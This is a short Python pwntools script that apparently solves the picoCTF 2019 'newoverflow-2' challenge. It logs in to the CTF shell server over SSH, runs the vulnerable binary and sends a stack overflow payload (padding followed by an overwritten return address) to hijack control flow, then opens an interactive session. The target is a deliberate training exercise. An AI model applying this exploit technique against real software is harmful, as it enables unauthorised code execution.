from pwn import *
import time

binary = "./newoverflow2"
#
#p = process(binary)
#
passwd = input().rstrip()
s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
p = s.process("vuln",cwd="/problems/newoverflow-2_3_3602cb64cd7f9512a10ae9139f8d8c2c")

payload=b"A"*0x40
payload+=b"b"*8
payload+=p64(0x0040084e) #0x10
p.sendlineafter(b"?",payload)
p.interactive()